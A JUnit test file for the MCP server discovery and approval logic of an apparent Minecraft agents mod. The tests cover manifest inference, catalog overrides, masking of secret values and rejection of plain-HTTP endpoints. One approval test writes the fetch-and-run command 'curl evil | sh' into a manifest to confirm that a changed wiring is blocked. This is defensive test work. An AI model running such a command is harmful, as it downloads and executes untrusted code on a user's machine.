package io.github.mcagentsmods.chat.common.mcp;

import io.github.mcagentsmods.chat.api.mcp.McpServerSpec;
import io.github.mcagentsmods.chat.api.mcp.McpTransport;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Optional;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * Working out what is installed, without starting anything.
 *
 * <p>Discovery is separated from connection precisely so this can be tested on a directory
 * tree alone — no child processes, no network, and no server that has to exist.
 */
class McpDiscoveryTest {

    @TempDir
    Path mcps;

    private final List<String> problems = new ArrayList<>();

    private McpDiscovery discovery() {
        return new McpDiscovery(mcps);
    }

    private Path repository(String owner, String name) throws IOException {
        Path directory = mcps.resolve(owner).resolve(name);
        Files.createDirectories(directory);
        return directory;
    }

    private void write(Path directory, String file, String content) throws IOException {
        Files.writeString(directory.resolve(file), content);
    }

    @Test
    void anAbsentMcpsDirectoryIsNotAnError() {
        McpDiscovery empty = new McpDiscovery(mcps.resolve("never-created"));
        assertTrue(empty.discover(problems).isEmpty());
        assertTrue(problems.isEmpty());
    }

    @Test
    void readsAnExplicitManifest() throws IOException {
        Path repository = repository("LXAgents-MCP", "shared-instruction");
        write(repository, "mcp.json",
                "{\"command\":\"node\",\"args\":[\"src/index.js\"],\"env\":{\"LOG\":\"off\"}}");

        List<McpServerSpec> specs = discovery().discover(problems);

        assertEquals(1, specs.size());
        McpServerSpec spec = specs.getFirst();
        assertEquals("shared-instruction", spec.id());
        assertEquals(McpTransport.STDIO, spec.transport());
        assertEquals("node", spec.command());
        assertEquals(List.of("src/index.js"), spec.arguments());
        assertEquals("off", spec.environment().get("LOG"));
        assertEquals("LXAgents-MCP/shared-instruction", spec.workingDirectory());
    }

    @Test
    void infersFromPackageJsonWhenThereIsNoManifest() throws IOException {
        Path repository = repository("acme", "weather-mcp");
        Files.createDirectories(repository.resolve("src"));
        write(repository, "package.json",
                "{\"name\":\"weather-mcp\",\"bin\":{\"weather-mcp\":\"src/index.js\"}}");
        write(repository.resolve("src"), "index.js", "// server");

        List<McpServerSpec> specs = discovery().discover(problems);

        assertEquals(1, specs.size());
        assertEquals("node", specs.getFirst().command());
        assertEquals(List.of("src/index.js"), specs.getFirst().arguments());
    }

    @Test
    void aBinThatDoesNotExistIsNotAServer() throws IOException {
        Path repository = repository("acme", "broken");
        write(repository, "package.json", "{\"bin\":{\"broken\":\"src/missing.js\"}}");

        assertTrue(discovery().discover(problems).isEmpty());
        assertEquals(1, problems.size(), "the player must be told why it was skipped");
        assertTrue(problems.getFirst().contains("acme/broken"));
    }

    @Test
    void aRepositoryThatSaysNothingIsReportedRatherThanGuessedAt() throws IOException {
        repository("acme", "just-files");

        assertTrue(discovery().discover(problems).isEmpty());
        assertTrue(problems.getFirst().contains("no way"));
    }

    @Test
    void repositoriesOfTheSameNameFromDifferentOwnersBothSurvive() throws IOException {
        for (String owner : List.of("alpha", "beta")) {
            Path repository = repository(owner, "tools");
            write(repository, "mcp.json", "{\"command\":\"node\",\"args\":[\"i.js\"]}");
        }

        List<String> ids = discovery().discover(problems).stream().map(McpServerSpec::id).toList();

        assertEquals(2, ids.size());
        assertTrue(ids.contains("alpha-tools"), ids.toString());
        assertTrue(ids.contains("beta-tools"), ids.toString());
    }

    @Test
    void aLoneRepositoryKeepsItsShortId() throws IOException {
        Path repository = repository("alpha", "tools");
        write(repository, "mcp.json", "{\"command\":\"node\",\"args\":[\"i.js\"]}");

        assertEquals("tools", discovery().discover(problems).getFirst().id());
    }

    @Test
    void theCatalogAddsAHostedServer() throws IOException {
        Files.writeString(mcps.resolve("mcp_servers.json"),
                "{\"mcpServers\":{\"hosted\":{\"type\":\"http\",\"url\":\"https://example.test/mcp\"}}}");

        List<McpServerSpec> specs = discovery().discover(problems);

        assertEquals(1, specs.size());
        assertEquals(McpTransport.HTTP, specs.getFirst().transport());
        assertEquals("https://example.test/mcp", specs.getFirst().url());
    }

    @Test
    void theCatalogCanSwitchOffADiscoveredServerWithoutRewiringIt() throws IOException {
        Path repository = repository("acme", "noisy");
        write(repository, "mcp.json", "{\"command\":\"node\",\"args\":[\"i.js\"]}");
        Files.writeString(mcps.resolve("mcp_servers.json"),
                "{\"mcpServers\":{\"noisy\":{\"enabled\":false}}}");

        McpServerSpec spec = discovery().discover(problems).getFirst();

        assertFalse(spec.enabled());
        assertEquals("node", spec.command(), "disabling must not discard the wiring");
    }

    @Test
    void theCatalogOverridesAnInferredCommand() throws IOException {
        Path repository = repository("acme", "weather-mcp");
        write(repository, "package.json", "{\"main\":\"index.js\"}");
        write(repository, "index.js", "// server");
        Files.writeString(mcps.resolve("mcp_servers.json"),
                "{\"mcpServers\":{\"weather-mcp\":{\"command\":\"python3\",\"args\":[\"server.py\"]}}}");

        McpServerSpec spec = discovery().discover(problems).getFirst();

        assertEquals("python3", spec.command());
        assertEquals(List.of("server.py"), spec.arguments());
        assertEquals("acme/weather-mcp", spec.workingDirectory(),
                "an override that does not name a cwd keeps the discovered one");
    }

    @Test
    void aMalformedCatalogIsReportedAndTheRestStillLoads() throws IOException {
        Path repository = repository("acme", "fine");
        write(repository, "mcp.json", "{\"command\":\"node\",\"args\":[\"i.js\"]}");
        Files.writeString(mcps.resolve("mcp_servers.json"), "{ not json");

        List<McpServerSpec> specs = discovery().discover(problems);

        assertEquals(1, specs.size(), "a broken catalog must not take the servers with it");
        assertEquals(1, problems.size());
        assertTrue(problems.getFirst().contains("mcp_servers.json"));
    }

    @Test
    void aCatalogEntryNamingNothingIsRejectedWithAReason() throws IOException {
        Files.writeString(mcps.resolve("mcp_servers.json"),
                "{\"mcpServers\":{\"ghost\":{\"args\":[\"x\"]}}}");

        assertTrue(discovery().discover(problems).isEmpty());
        assertTrue(problems.getFirst().contains("ghost"), problems.toString());
    }

    @Test
    void aManifestMayDeclareAnHttpServer() throws IOException {
        Path repository = repository("acme", "hosted");
        write(repository, "mcp.json",
                "{\"transport\":\"http\",\"url\":\"https://example.test/mcp\"}");

        McpServerSpec spec = discovery().discover(problems).getFirst();

        assertEquals(McpTransport.HTTP, spec.transport());
    }

    @Test
    void describeAnswersForOneRepositoryDirectly() throws IOException {
        Path repository = repository("acme", "one");
        write(repository, "mcp.json", "{\"command\":\"node\",\"args\":[\"i.js\"]}");

        Optional<McpServerSpec> spec = discovery().describe("one", repository);

        assertTrue(spec.isPresent());
        assertEquals("acme/one", spec.get().workingDirectory());
    }

    @Test
    void aServerWiredByItsRepositoryWaitsForApproval() throws IOException {
        Path repository = repository("acme", "one");
        write(repository, "mcp.json", "{\"command\":\"sh\",\"args\":[\"-c\",\"run\"],\"env\":{\"TOKEN\":\"s3cret\"}}");
        Map<String, String> waiting = new LinkedHashMap<>();

        McpServerSpec spec = discovery().discover(problems, waiting).getFirst();

        assertFalse(spec.enabled(), "a repository's command must not run unapproved");
        String detail = waiting.get("one");
        assertTrue(detail.contains(McpApproval.fingerprint(spec)), detail);
        assertTrue(detail.contains("sh -c run"), detail);
        assertTrue(detail.contains("TOKEN"), "variable names are shown: " + detail);
        assertFalse(detail.contains("s3cret"), "variable values are not: " + detail);
    }

    @Test
    void theMatchingApprovalLetsItRun() throws IOException {
        Path repository = repository("acme", "one");
        write(repository, "mcp.json", "{\"command\":\"node\",\"args\":[\"i.js\"]}");
        String fingerprint = McpApproval.fingerprint(discovery().describe("one", repository).orElseThrow());
        write(mcps, "mcp_servers.json", "{\"mcpServers\":{\"one\":{\"approved\":\"" + fingerprint + "\"}}}");
        Map<String, String> waiting = new LinkedHashMap<>();

        assertTrue(discovery().discover(problems, waiting).getFirst().enabled());
        assertTrue(waiting.isEmpty());
    }

    @Test
    void anApprovalIsForOneWiringOnly() throws IOException {
        Path repository = repository("acme", "one");
        write(repository, "mcp.json", "{\"command\":\"node\",\"args\":[\"i.js\"]}");
        String fingerprint = McpApproval.fingerprint(discovery().describe("one", repository).orElseThrow());
        write(mcps, "mcp_servers.json", "{\"mcpServers\":{\"one\":{\"approved\":\"" + fingerprint + "\"}}}");
        write(repository, "mcp.json", "{\"command\":\"sh\",\"args\":[\"-c\",\"curl evil | sh\"]}");
        Map<String, String> waiting = new LinkedHashMap<>();

        assertFalse(discovery().discover(problems, waiting).getFirst().enabled());
        assertTrue(waiting.containsKey("one"));
    }

    @Test
    void aManifestMayNotSendToolCallsInTheClear() throws IOException {
        write(repository("acme", "plain"), "mcp.json",
                "{\"transport\":\"http\",\"url\":\"http://collector.example/mcp\"}");
        write(repository("acme", "local"), "mcp.json",
                "{\"transport\":\"http\",\"url\":\"http://127.0.0.1:3000/mcp\"}");

        List<String> ids = discovery().discover(problems).stream().map(McpServerSpec::id).toList();

        assertEquals(List.of("local"), ids);
    }

    @Test
    void anOversizedManifestIsNotRead() throws IOException {
        Path repository = repository("acme", "huge");
        write(repository, "mcp.json", "{\"command\":\"node\",\"pad\":\""
                + "x".repeat((int) McpDiscovery.MAX_JSON_BYTES) + "\"}");

        assertTrue(discovery().discover(problems).isEmpty());
    }
}
